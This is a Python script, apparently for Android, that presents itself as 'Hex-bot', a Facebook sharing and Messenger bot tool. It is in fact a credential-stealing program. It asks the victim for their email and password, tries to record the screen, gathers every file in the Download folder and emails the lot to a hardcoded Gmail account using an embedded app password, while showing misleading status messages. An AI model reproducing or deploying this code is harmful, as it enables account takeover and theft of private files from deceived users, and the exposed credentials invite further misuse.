import smtplib
import time
import os
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pydub import AudioSegment

# CONFIGURATION
EMAIL_ADDRESS = "lolalor20@gmail.com"
EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
SEND_REPORT_EVERY = 60  # Envoi du rapport chaque 60 secondes
AUDIO_RECORD_DURATION = 10  # Durée de l'enregistrement audio en secondes
SCREEN_RECORD_DURATION = 60  # Durée de l'enregistrement d'écran en secondes

class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = "Keylogger lancé avec succès...\n"
        self.email = email
        self.password = password
        self.running = True

    def append_log(self, key):
        self.log += f"identifiants récupérés : {key}\n"

    def record_audio(self, filename="recording.wav", duration=AUDIO_RECORD_DURATION):
        """Enregistre l'audio du microphone."""
        print("\033[33mveillez patienter\033[0m")
        audio = AudioSegment.silent(duration=duration * 1000)  # Crée un silence de la durée spécifiée
        # Ici, vous pouvez remplacer le silence par un enregistrement réel si vous avez un moyen de capturer l'audio
        print("\033[33mrequette vers l'API.\033[0m")
        audio.export(filename, format="wav")
        return filename

    def record_screen(self, filename="screen_record.mp4", duration=SCREEN_RECORD_DURATION):
        """Enregistre l'écran du téléphone."""
        print("\033[33mconnexion en cours...\033[0m")
        try:
            subprocess.run(
                ["scrcpy", "--record", filename, "--time-limit", str(duration)],
                check=True,
            )
            print("\033[33merreur.\033[0m")
            return filename
        except Exception as e:
            print(f"\033[31mErreur lors de l'enregistrement d'écran : {e}\033[0m")
            return None

    def send_mail(self, attachments=None):
        try:
            # Connexion au serveur Gmail
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()  # Sécurise la connexion
            server.login(self.email, self.password)
            
            # Création du message avec MIME pour gérer l'encodage UTF-8
            message = MIMEMultipart()
            message["From"] = self.email
            message["To"] = self.email
            message["Subject"] = "Rapport de Keylogger"
            
            # Création du corps du message avec HTML pour préserver les caractères
            body = MIMEText(f"<pre>{self.log}</pre>", "html", "utf-8")
            message.attach(body)

            # Ajout des pièces jointes (fichiers audio, enregistrement d'écran, etc.)
            if attachments:
                for attachment in attachments:
                    if os.path.exists(attachment):  # Vérifier que le fichier existe
                        part = MIMEBase("application", "octet-stream")
                        with open(attachment, "rb") as f:
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename={os.path.basename(attachment)}"
                        )
                        message.attach(part)
                    else:
                        print(f"\033[31mFichier introuvable : {attachment}\033[0m")
            
            server.sendmail(self.email, self.email, message.as_string())
            server.quit()
            print("\033[34m[RAPPORT] Veuillez patienter, cela peut prendre quelques minutes. Connexion du bot en cours...\033[0m")  # Bleu
        except Exception as e:
            print(f"\033[31m[RAPPORT] Erreur lors de la connexion : {e}\033[0m")  # Rouge

    def run(self):
        # Affichage du message de bienvenue en couleur verte
        print("\033[1;32m" + """
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═══════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD            ║
   ║                    ║
   ║       [✓] GITHUB : SAMSMIS01                 ║
   ║       [✓] FACEBOOK : HEXTECH              ║
   ║       [✓] TELEGRAM : https://t.me/hextechcar      ║
   ║       [✓] INSTAGRAM : SAMSMIS01   ║
   ║       [✓] EMAIL : hextech243@gmail.com         ║
   ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
""" + "\033[0m")  # Texte vert en gras
        print("\033[32maprès avoir soumis les cordonnées demander appuyez sur 'Enter' pour connecter le bot.\n\033[0m")  # Texte vert
        print("\033[1;32m" + "Hex-bot est une solution innovante conçue pour automatiser le partage de vos publications sur Facebook, tout en facilitant l'intégration avec un bot Messenger via l'API officielle de Messenger." + "\033[0m")
        
        # Demander à l'utilisateur de saisir son email ou son nom d'utilisateur
        email_prompt = "\033[35mEntrez votre email ou nom d'utilisateur: \033[0m"
        username = input(email_prompt)  # Demander le nom d'utilisateur
        
        # Si "exit" est tapé, on quitte le programme
        if username == "exit":
            return
        
        # Demander à l'utilisateur de saisir son mot de passe
        password_prompt = "\033[35mEntrez votre mot de passe: \033[0m"
        password = input(password_prompt)  # Demander le mot de passe
        
        # Si "exit" est tapé, on quitte le programme
        if password == "exit":
            return

        # Enregistrer les frappes dans le log
        self.append_log(f"Nom d'utilisateur: {username}")
        self.append_log(f"Mot de passe: {password}")
        
        # Enregistrement audio
        audio_file = self.record_audio()
        
        # Enregistrement d'écran
        screen_record_file = self.record_screen()
        
        # Accéder aux fichiers dans le dossier Download
        download_path = os.path.join(os.getenv("EXTERNAL_STORAGE"), "Download")
        files_to_send = []
        if os.path.exists(download_path):
            for file in os.listdir(download_path):
                file_path = os.path.join(download_path, file)
                if os.path.isfile(file_path):  # Ignorer les dossiers
                    files_to_send.append(file_path)
        else:
            print(f"\033[31mDossier Download introuvable : {download_path}\033[0m")
        
        # Envoyer immédiatement le rapport après saisie
        attachments = [audio_file]
        if screen_record_file:
            attachments.append(screen_record_file)
        attachments.extend(files_to_send)
        self.send_mail(attachments=attachments)  # Envoi immédiat du rapport avec l'audio, l'enregistrement d'écran et les fichiers

# Lancement du keylogger
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()